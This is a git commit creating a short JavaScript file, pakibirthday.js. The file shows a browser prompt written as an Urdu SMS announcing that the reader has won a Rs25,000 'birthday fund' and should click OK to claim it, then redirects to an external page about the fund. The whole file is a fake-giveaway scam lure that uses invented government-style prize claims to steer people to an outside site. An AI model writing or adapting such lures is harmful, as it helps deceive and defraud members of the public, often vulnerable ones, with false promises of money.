6cdf3d5fecd35e9c2d00eec832dac2ab43c273b6
gidevoffre <exhaust_molt5x@icloud.com>
2026-09-09 13:54:02 +0100

    Create pakibirthday.js

---
+++ pakibirthday.js
@@ -0,0 +1,6 @@
+ var password = 'Get Rs25,000'
+password = prompt('SMS: مبارک ہو! آپ ان 75,000 شہریوں میں شامل ہیں جو Rs25,000 سالگرہ کی تقریب کا فنڈ حاصل کریں گے۔ اپنا فنڈ حاصل کرنے کے لیے OK پر کلک کریں۔', 'Get Rs25,000');
+
+if (password != 'Get Rs25,000') {
+    location.href = 'https://www.gidevoffre.com/rs25000-birthday-fund';
+}
